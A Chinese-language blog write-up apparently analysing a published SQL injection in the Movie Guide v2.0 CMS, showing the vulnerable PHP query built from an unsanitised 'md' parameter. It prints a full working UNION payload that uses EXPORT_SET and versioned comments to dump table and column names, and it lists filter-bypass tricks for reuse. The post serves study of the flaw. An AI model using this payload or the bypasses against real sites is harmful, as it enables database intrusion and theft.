---
title: MovieGuide v2.0 SQLi
tags: 
 - cms
categories: codereview
date: 2018-02-03 13:37:35
---

# 0x00
Detail: [Movie Guide v2.0 SQL Injection](https://www.exploit-db.com/exploits/43346/)

<!-- more -->

# 0x01
这是一个比较粗糙的开源cms，总体来说并没有对输入输出做安全处理，从PoC入手，选一个还原一下漏洞形成过程。
### PoC：index.php?md=[SQL]
定位一下md参数
layout.php为该cms的主要入口处理,下述的变量均没有通过安全处理，直接SQL语句，从而都可以用于数据库注入。
```php
//Get the passed variables.
$mterm = filter_input(INPUT_POST, 'tterm');
$cterm = filter_input(INPUT_POST, 'gterm');
$lterm = filter_input(INPUT_GET, 'gterm');
$yterm = filter_input(INPUT_GET, 'year');
$md = filter_input(INPUT_GET, 'md');
$actorname = filter_input(INPUT_GET, 'actor');
$directorname = filter_input(INPUT_GET, 'director');
```
直接拼接入SQL语句
```
$sql = "SELECT * FROM `Movie_List` WHERE `Main_Dir` LIKE '" . $md . "' ORDER BY `Movie_Title` ASC Limit $start, $perpage";
```
这里比较有意思的是它的PoC，以前没有见过类似的:b，PoC中使用了export_set函数

### `EXPORT_SET(bits,on,off[,separator[,number_of_bits]])`
`Returns a string such that for every bit set in the value bits, you get an on string and for every bit not set in the value, you get an off string. Bits in bits are examined from right to left (from low-order to high-order bits). Strings are added to the result from left to right, separated by the separator string (the default being the comma character ,). The number of bits examined is given by number_of_bits, which has a default of 64 if not specified. number_of_bits is silently clipped to 64 if larger than 64. It is treated as an unsigned integer, so a value of −1 is effectively the same as 64.`

分解一下PoC
```
/*!02222UNION*/
(
    /*!02222SELECT*/ 0x253238253331253239,0x253238253332253239,
        (
            /*!02222Select*/
                export_set(5,@a:=0,
                (/*!02222select*/ count(*)/*!02222from*/(information_schema.columns)where@a:=// data->@a
                    export_set(5,
                        export_set(5,@a,/*!02222table_name*/,'<li>',2)//dump table_name [0<li>table_name]
                    ,/*!02222column_name*/,'\n:',2)//dump column_name [0<li>table_name\n:columns_name]
                )
            ,@a,2)//set @a split char
        )
    ,0x253238253334253239,0x253238253335253239,0x253238253336253239,0x253238253337253239,0x253238253338253239,0x253238253339253239,0x253238253331253330253239,0x253238253331253331253239,0x253238253331253332253239
    )-- -
```

这里主要利用的是export_set函数的no，off位置来dump数据。

- 首先通过@a:=0，定义变量a为0（可能跟mysql版本有关系，5.7.x下的mysql无法用@:=0来定义）
- 最里面的export_set，将table_name dump出来（结果为`0<li>table_name`）
- 接下来的一个export_set，将columns_name dump出来(结果为`0<li>table_name\n:columns_name`)
- `select count(*) from (information_schema.columns)where@a:=export_set(5,export_set(5,@a,table_name,'<li>',2),column_name,'\n:',2)`将上述的数据赋值给变量a
- 最后用最后一个export_set，用@a做分隔符，将数据dump出来

## 0x02 总结
该cms的注入漏洞很常规，主要是学习分析了该PoC，能在未来注入绕过的地方应用。
1. mysql的自定义变量@的应用，可以在一定程度上消除空格，以及正则`\bwhere\b`的绕过
2. /!02222select*/这个方法也是经常听说，也在这里用到了，一个很好的例子。
3. export_set的应用，比较重要的应用，在某些情况下可用于绕过


